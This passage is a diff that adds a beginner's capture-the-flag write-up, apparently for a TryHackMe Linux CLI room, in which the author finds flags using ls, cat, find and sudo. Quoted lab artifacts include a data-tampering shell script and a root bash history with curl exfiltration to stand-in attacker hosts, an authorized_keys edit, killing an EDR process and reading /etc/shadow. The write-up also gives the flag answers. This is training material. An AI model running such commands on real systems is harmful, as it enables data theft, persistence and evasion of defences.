@@ -74,3 +74,82 @@ This served as a basic reminder of the broad divisions of cyber security and wha
 ### References
 - N/A
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Day 1: Linux CLI - Shells Bells
+On this day, we learned the basics of Linux Command Line Interface (CLI) via solving challenges following the walkrthroughs given alongside. 
+
+### Solution 
+- We first had to `cat` command to read the `README.txt` file which told us to look around for the guides. Using the `ls` command, I was able to see that there was a directory labelled `Guides`. I used the `cd` command to navigate to that directory. Now files can be hidden on the system if they start with `.`. I used the `ls -al` command to find out all the directories in the `/home/mcskidy/Guides` directory. The output is as below: 
+```bash
+mcskidy@tbfc-web01:~$ ls 
+Desktop    Downloads  Music     Public      Templates  snap
+Documents  Guides     Pictures  README.txt  Videos
+mcskidy@tbfc-web01:~$ cat README.txt
+For all TBFC members,
+Yesterday I spotted yet another Eggsploit on our servers.
+Not sure what it means yet, but Wareville is in danger.
+To be prepared, I'll write the security guide by tomorrow.
+As a precaution, I'll also hide the guide from plain view.
+~ McSkidy
+mcskidy@tbfc-web01:~$ cd Guides
+mcskidy@tbfc-web01:~/Guides$ ls -al
+total 12
+drwxrwxr-x  2 mcskidy mcskidy 4096 Oct 29 20:46 .
+drwxr-x--- 21 mcskidy mcskidy 4096 Nov 13 17:10 ..
+-rw-rw-r--  1 mcskidy mcskidy  506 Oct 29 20:46 .guide.txt
+mcskidy@tbfc-web01:~/Guides$ cat .guide.txt
+I think King Malhare from HopSec Island is preparing for an attack.
+Not sure what his goal is, but Eggsploits on our servers are not good.
+Be ready to protect Christmas by following this Linux guide:
+
+Check /var/log/ and grep inside, let the logs become your guide.
+Look for eggs that want to hide, check their shells for what's inside!
+
+P.S. Great job finding the guide. Your flag is:
+-----------------------------------------------
+THM{learning-linux-cli}
+-----------------------------------------------
+mcskidy@tbfc-web01:~/Guides$ 
+```
+- We got the first flag as above and the hint for the next flag in this challenge, where we were told by McSkidy to check the `/var/log` and `grep` to look for eggs that want to hide. So I navigated to the `/var/log` directory and used the command `grep "Failed Password" auth.log`. This gave me a lot of useless results. So I then read the challenge which told us that we need to find with names `egg` in `/home/socmas` directory. I then use the precrafted command `find /home/socmas -name *egg*`. This gave a shell script. On reading the shell script, I learned that the true wishlist of Christmas was deleted and it was replaced with a fake one. This also gave us our flag.
+```bash
+mcskidy@tbfc-web01:~/Guides$ find /home/socmas -name *egg* 
+/home/socmas/2025/eggstrike.sh
+mcskidy@tbfc-web01:~/Guides$ cat /home/socmas/2025/eggstrike.sh
+# Eggstrike v0.3
+# © 2025, Sir Carrotbane, HopSec
+cat wishlist.txt | sort | uniq > /tmp/dump.txt
+rm wishlist.txt && echo "Chistmas is fading..."
+mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
+
+# Your flag is:
+# THM{sir-carrotbane-attacks}
+mcskidy@tbfc-web01:~/Guides$
+```
+- For the final flag, we had to check the root history to figure out what flag was left behind by Sir Carrotbane in the root histroy. We had to check this by first switching to root user by doing `sudo su` and then reading the history left behind in the `/root/.bash_history` file.
+```bash
+mcskidy@tbfc-web01:~/Guides$ sudo su 
+root@tbfc-web01:/home/mcskidy/Guides$ cd 
+root@tbfc-web01:~$ less .bash_history
+whoami
+cd ~
+ll 
+nano .ssh/authorized_keys 
+curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
+curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
+curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
+pkill tbfcedr
+cat /etc/shadow
+cat /etc/hosts
+exit
+cd 
+cd .bash_history
+less .bash_history
+
+```
+
+### What I learned 
+These were pretty simple challenges and the walk throughs made it even simpler. This basically served as a revision. 
+### Notes
+N/A
+### References
+N/A
